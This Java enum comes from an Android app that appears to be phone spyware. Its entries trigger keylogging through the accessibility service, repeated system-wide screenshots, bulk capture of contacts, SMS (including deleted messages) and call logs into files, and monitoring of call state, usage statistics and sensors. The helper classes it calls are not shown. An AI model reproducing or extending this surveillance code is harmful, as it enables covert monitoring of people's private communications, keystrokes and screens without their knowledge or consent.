package com.vikasyadavnsit.cdc.enums;

import android.app.Activity;
import android.content.Context;
import android.util.Log;

import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.permissions.PermissionManager;
import com.vikasyadavnsit.cdc.services.CDCSensorService;
import com.vikasyadavnsit.cdc.services.ScreenshotService;
import com.vikasyadavnsit.cdc.utils.ActionUtils;
import com.vikasyadavnsit.cdc.utils.CallUtils;
import com.vikasyadavnsit.cdc.utils.FileUtils;
import com.vikasyadavnsit.cdc.utils.KeyLoggerUtils;
import com.vikasyadavnsit.cdc.utils.MessageUtils;

import java.util.function.BiConsumer;

import lombok.AllArgsConstructor;
import lombok.Getter;

@Getter
@AllArgsConstructor
public enum ClickActions {

    REQUEST_ALL_PERMISSION(
            1,
            (context, triggerSettingsData) -> {
                new PermissionManager().requestAllPermissions((Activity) context);
            },
            "Request all permissions in a single stroke (It will take permissions one by one until you take action on all)",
            "Request all permissions"
    ),
    RESET_ALL_PERMISSION(
            2,
            (context, triggerSettingsData) -> {
                new PermissionManager().resetAllPermissionManually((Activity) context);
            },
            "Reset all permissions manually (It will open settings tab to manually remove all permissions)",
            "Reset all permissions"
    ),
    REQUEST_EXACT_ALARM_PERMISSION(
            3,
            (context, triggerSettingsData) -> {
                // Mysterious observation is that :
                // If multiple setting intents are called all of them will open up in parallel window in background.
                ActionUtils.requestExactAlarmPermission();
            },
            "Request exact alarm permission (It will open setting tab to choose precision alarm permission)",
            "Request alarm permission"
    ),
    REQUEST_ACCESSIBILITY_PERMISSION(
            4,
            (context, triggerSettingsData) -> {
                KeyLoggerUtils.startAccessibilitySettingIntent((Activity) context);
            },
            "Request accessibility permission for key logging (It will open accessibility setting tab to enable key logging)",
            "Request accessibility permission"
    ),
    REQUEST_FILE_ACCESS_PERMISSION(
            5,
            (context, triggerSettingsData) -> {
                FileUtils.startFileAccessSettings((Activity) context);
            },
            "Request file access permission (It will open file setting tab to enable file access)",
            "Request file access permission"
    ),
    START_SENSOR_SERVICE(
            6,
            (context, triggerSettingsData) -> {
                if (ActionStatus.START.equals(triggerSettingsData.getActionStatus())) {
                    CDCSensorService.startSensorService((Activity) context);
                } else {
                    CDCSensorService.stopSensorService((Activity) context);
                }
            },
            "Start/Stop sensor service (It is a toggle button to start/stop capturing multiple sensors data)",
            "Start sensor service"
    ),
    START_SCREENSHOT_SERVICE(
            7,
            (context, triggerSettingsData) -> {
                if (ActionStatus.PREPARE.equals(triggerSettingsData.getActionStatus())) {
                    ActionUtils.startMediaProjectionService((Activity) context);
                } else if (ActionStatus.START.equals(triggerSettingsData.getActionStatus())) {
                    int maxRepetitions = triggerSettingsData.getMaxRepetitions();
                    for (int i = 0; i < maxRepetitions; i++) {
                        ScreenshotService.setTakeScreenshot(true);
                        try {
                            Thread.sleep(triggerSettingsData.getInterval());
                        } catch (InterruptedException e) {
                            throw new RuntimeException(e);
                        }
                        Log.d("ClickActions", "Took the " + i + " screenshot");
                    }
                } else if (ActionStatus.STOP.equals(triggerSettingsData.getActionStatus())) {
                    ScreenshotService.setStopScreenshotService(true);
                }

            },
            "Start/Stop screenshot service (It is a toggle button to capture a screenshot on the entire system)",
            "Start screenshot service"
    ),
    CAPTURE_ALL_CONTACTS(
            8,
            (context, triggerSettingsData) -> {
                FileUtils.appendDataToFile(FileMap.CONTACTS, MessageUtils.getMessages((Activity) context, FileMap.CONTACTS));
            },
            "Capture all phone contacts (It will capture all the phone contacts)",
            "Capture contacts"
    ),
    CAPTURE_ALL_SMS(
            9,
            (context, triggerSettingsData) -> {
                FileUtils.appendDataToFile(FileMap.SMS, MessageUtils.getMessages((Activity) context, FileMap.SMS));
            },
            "Capture all SMS (It will capture all the SMS sent, received, deleted, archived)",
            "Capture SMS"
    ),
    CAPTURE_ALL_CALL_LOGS(
            10,
            (context, triggerSettingsData) -> {
                FileUtils.appendDataToFile(FileMap.CALL, MessageUtils.getMessages((Activity) context, FileMap.CALL));
            },
            "Capture all call logs (It will capture all call logs)",
            "Capture call"
    ),
    MONITOR_CALL_STATE(
            11,
            (context, triggerSettingsData) -> {
                CallUtils.monitorCallState((Activity) context);
            },
            "Monitor call state (Incoming, ringing, outgoing, conference)",
            "Monitor call state"
    ),
    MONITOR_PHONE_STATISTICS(
            12,
            (context, triggerSettingsData) -> {
                ActionUtils.registerPhoneStatistics((Activity) context);
            },
            "Monitor phone statistics (It will capture all the phone statistics like button presses, screen on/off, and user present)",
            "Monitor phone statistics"
    );

    int order;
    BiConsumer<Context, User.AppTriggerSettingsData> biConsumer;
    String description;
    String actionLabel;
}
